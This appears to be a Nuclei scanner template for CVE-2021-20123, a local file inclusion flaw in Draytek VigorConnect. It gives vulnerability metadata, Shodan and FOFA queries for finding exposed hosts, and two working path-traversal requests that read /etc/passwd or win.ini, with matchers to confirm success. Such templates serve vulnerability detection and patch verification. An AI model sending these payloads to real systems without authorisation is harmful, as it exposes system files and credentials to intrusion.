id: CVE-2021-20123

info:
  name: Draytek VigorConnect 1.6.0-B - Local File Inclusion
  author: 0x_Akoko
  severity: high
  description: |
    Draytek VigorConnect 1.6.0-B3 is susceptible to local file inclusion in the file download functionality of the DownloadFileServlet endpoint. An unauthenticated attacker could leverage this vulnerability to download arbitrary files from the underlying operating system with root privileges.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to read sensitive files on the server, potentially leading to unauthorized access or information disclosure.
  remediation: |
    Apply the latest security patches or updates provided by the vendor to fix the LFI vulnerability in Draytek VigorConnect 1.6.0-B.
  reference:
    - https://www.tenable.com/security/research/tra-2021-42
    - https://nvd.nist.gov/vuln/detail/CVE-2021-20123
    - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2021-20123
    cwe-id: CWE-22
    epss-score: 0.93989
    epss-percentile: 0.9988
    cpe: cpe:2.3:a:draytek:vigorconnect:1.6.0:beta3:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: draytek
    product: vigorconnect
    shodan-query:
      - http.html:"VigorConnect"
      - http.html:"vigorconnect"
    fofa-query: body="vigorconnect"
  tags: cve2021,cve,draytek,lfi,vigorconnect,tenable,kev,vkev,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/ACSServer/DownloadFileServlet?show_file_name=../../../../../../etc/passwd&type=uploadfile&path=anything"
      - "{{BaseURL}}/ACSServer/DownloadFileServlet?show_file_name=../../../../../../windows/win.ini&type=uploadfile&path=anything"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "application/octet-stream"

      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "for 16-bit app support"
        condition: or

      - type: status
        status:
          - 200
# digest: 4a0a00473045022100d213eaa9375987e6beadce6e4937c255eafd847c98749ae6cb9cd83d50e1b5c502203d89d00f14a1553cd466cadcc4e610e4387041e123c97ed2a0601d21bdd3bf4f:922c64590222798bb761d5b6d8e72950